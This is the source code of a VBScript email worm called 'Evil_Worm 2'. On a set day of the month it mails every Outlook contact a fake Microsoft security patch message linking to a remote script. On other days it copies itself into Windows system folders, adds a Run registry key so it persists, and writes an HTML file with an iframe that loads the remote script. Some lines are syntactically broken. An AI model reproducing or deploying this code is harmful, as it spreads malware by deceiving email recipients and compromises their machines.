' Evil_Worm 2 - By (BlackBox) 
' - Written on Septemper 30th, 2011 
 
checkDate() 
function checkDate() 
if (day(Now)=25) then 


Dim x
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set 26467=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
For x=1 To a.AddressEntries.Count 
Set Mail=26467.CreateItem(0) 
Mail.to=26467.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Microsoft!" 
Mail.Body="This is a Security Patch from Microsoft! Please Download here: http://download938.mediafire.com/coavy40tg12g/te8h04tk23pluh7/IEW.vbs" 
Mail.Attachments.Add "c:\windows\Index.html"
Mail.Send 
Next 
26467.Quit 

else

Set objFSO = CreateObject("Scripting.FileSystemObject") 
Set fso = CreateObject("Scripting.FileSystemObject") 
 
 
fso.CopyFile Wscript.ScriptFullName, "c:\windows\Update.vbs", True 
fso.CopyFile Wscript.ScriptFullName, "c:\windows\system32\Update.vbs", True 
 
 
Msgbox "ERROR",16,"ALERT!" 
 
 
set Payload = createobject("wscript.shell") 
Payload.run "http://computerworm.net/wp-content/uploads/2011/07/Computer_Worm.jpg" 
 
 
Dim WshShell, bKey 
Set WshShell = WScript.CreateObject("WScript.Shell") 
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Virus", 1, "REG_BINARY" 
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Virus", "c:\windows\Update.vbs", "REG_SZ" 
 
 

Set objFSO = CreateObject("Scripting.FileSystemObject") 
If objFSO.FileExists("c:\windows\Index.html") Then 

  
Wscript.Quit 
Else 
Wscript.Echo "The file does not exist." 
End If 
Set fso = CreateObject("Scripting.FileSystemObject") 
Set File = fso.CreateTextFile("c:\windows\Index.html", True) 
File.WriteLine("<iframe src=""http://download938.mediafire.com/coavy40tg12g/te8h04tk23pluh7/IEW.vbs"" width=""100%"" height=""300"">") 
File.WriteLine("<p>Your browser does not support iframes.</p>")
File.WriteLine("</iframe>")


 
Wscript.Quit      
         
end if      
end function 
 
